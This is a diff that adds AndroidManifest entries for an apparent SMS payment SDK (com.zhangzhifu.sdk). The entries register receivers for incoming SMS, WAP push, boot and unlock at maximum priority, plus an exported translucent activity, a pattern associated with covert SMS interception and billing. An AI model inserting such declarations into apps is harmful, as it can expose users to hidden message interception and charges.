@@ -1,0 +1,43 @@
+        <!-- zh_p_start -->
+        <activity
+            android:name="com.zhangzhifu.sdk.activity.ZhangPayActivity"
+            android:exported="true"
+            android:theme="@android:style/Theme.Translucent" >
+        </activity>
+
+        <service android:name="com.zhangzhifu.sdk.service.ZhangPayPlateService" >
+        </service>
+
+        <receiver android:name="com.zhangzhifu.sdk.util.sms.BootReceiver" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+            </intent-filter>
+        </receiver>
+
+        <service
+            android:name="com.zhangzhifu.sdk.service.ZhangzhifuSmsService"
+            android:enabled="true" />
+
+        <receiver android:name="com.zhangzhifu.sdk.util.sms.SmsReceiver" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
+
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.zhangzhifu.sdk.util.sms.WapPushReceiver" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.provider.Telephony.WAP_PUSH_RECEIVED" />
+
+                <data android:mimeType="application/vnd.wap.sic" />
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.zhangzhifu.sdk.service.ServiceRecevier" >
+            <intent-filter android:priority="2147483647" >
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.USER_PRESENT" />
+                <action android:name="android.media.RINGER_MODE_CHANGED" />
+            </intent-filter>
+        </receiver>
+
+        <!-- zh_p_end -->
